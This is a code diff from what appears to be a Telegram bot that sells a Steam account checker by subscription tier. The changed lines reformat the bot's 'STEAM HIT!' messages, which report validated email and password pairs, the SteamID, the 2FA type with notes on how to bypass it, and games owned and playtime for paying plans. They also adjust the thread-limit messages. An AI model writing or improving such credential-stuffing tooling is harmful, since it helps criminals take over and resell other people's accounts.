@@ -1102,7 +1102,7 @@ Limits by plan:
 ⭐ BASIC: <b>1-25</b>
 👑 VIP / YEARLY: <b>1-40</b>
 
-Your plan <b>{plan}</b> allows <b>1-{max_t}</b> threads.
+Your plan <b>{get_plan_with_emoji(stats.get('plan'))}</b> allows <b>1-{max_t}</b> threads.
 
 Current threads: <b>{limits['current_threads']}</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1259,16 +1259,15 @@ Try another account!
             else "🔒" if result.get('profile_visibility') == "Private" \
             else "👥"
 
-        # Base header — FREE plan (everyone gets this)
+        # Base header — no separator here
         text = f"""✅ <b>STEAM HIT!</b>
 
 📧 <b>Email:</b> <code>{result['email']}</code>
 🔑 <b>Password:</b> <code>{result['password']}</code>
 🆔 <b>SteamID:</b> <code>{result.get('steamid', 'N/A')}</code>
-🌍 <b>Country:</b> {country_display if country_code not in ["Unknown", "ZZ", "", "UNKNOWN"] else "Not Set by User"}
-━━━━━━━━━━━━━━━━━━━━━━━━"""
+🌍 <b>Country:</b> {country_display if country_code not in ["Unknown", "ZZ", "", "UNKNOWN"] else "Not Set by User"}"""
 
-        # 2FA section — shown on ALL plans, separator only when 2FA exists
+        # 2FA — separator ONLY appears when 2FA exists
         if result.get('twofa'):
             twofa_type = result.get('twofa_type', 'Unknown')
             if twofa_type == 'Authenticator':
@@ -1277,11 +1276,11 @@ Try another account!
                 note = "Needs email inbox access"
             else:
                 note = "Device confirmation needed"
+            text += f"\n━━━━━━━━━━━━━━━━━━━━━━━━"
             text += f"\n🔐 <b>2FA Type:</b> <code>{twofa_type}</code>"
             text += f"\n📝 <b>Note:</b> {note}"
-            text += "\n━━━━━━━━━━━━━━━━━━━━━━━━"
 
-        # BASIC+ — profile visibility + games owned + games list privacy
+        # BASIC+ — profile + games
         if user_plan in ["BASIC", "VIP", "YEARLY"]:
             if result.get('games_count') == 0 and result.get('profile_visibility') == 'Public':
                 games_privacy = "Hidden 🔒"
@@ -1289,6 +1288,7 @@ Try another account!
                 games_privacy = "Visible ✅"
             result['games_privacy'] = games_privacy
 
+            text += f"\n━━━━━━━━━━━━━━━━━━━━━━━━"
             text += f"\n{visibility_emoji} <b>Profile:</b> <code>{result.get('profile_visibility', 'Unknown')}</code>"
             text += f"\n🎮 <b>Games List:</b> <code>{result.get('games_privacy', 'Unknown')}</code>"
 
@@ -1298,7 +1298,7 @@ Try another account!
                 else:
                     text += f"\n🎮 <b>Games Owned:</b> <code>{result['games_count']}</code>"
 
-        # VIP/YEARLY — playtime + top games list
+        # VIP/YEARLY — playtime + top games
         if user_plan in ["VIP", "YEARLY"]:
             if result.get('total_playtime', 0) > 0:
                 text += f"\n⏳ <b>Total Playtime:</b> <code>{result['total_playtime']:,} hours</code>"
@@ -1308,7 +1308,7 @@ Try another account!
                 for game in result['games'][:10]:
                     text += f"\n   • {game['name']} ({game['playtime_hours']}h)"
 
-        # Footer — always once at the bottom
+        # Single footer — always at the bottom
         text += f"\n━━━━━━━━━━━━━━━━━━━━━━━━"
         text += f"\nChannel: {CHANNEL_USERNAME}"
         return text
@@ -2116,7 +2116,7 @@ async def process_thread_count_input(update: Update, context: CallbackContext):
             
         else:
             await update.message.reply_text(
-                f"❌ Your plan <b>({plan_name})</b> allows a maximum of <b>{max_allowed}</b> threads.",
+                f"❌ Your plan <b>{get_plan_with_emoji(stats.get('plan'))}</b> allows a maximum of <b>{max_allowed}</b> threads.",
                 parse_mode='HTML'
             )
             return
